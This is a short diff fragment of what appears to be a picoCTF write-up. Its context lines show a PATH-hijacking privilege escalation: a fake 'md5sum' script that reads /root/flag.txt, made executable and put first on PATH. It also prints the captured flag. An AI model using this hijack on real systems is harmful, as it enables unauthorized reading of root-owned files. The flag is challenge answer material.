@@ -25,6 +25,6 @@ echo 'cat /root/flag.txt' >> md5sum
 chmod +x md5sum  # Make it executable
 export PATH=.:$PATH
 ```
-
+```
 exploited string: picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_fc434b2b}
-
+```
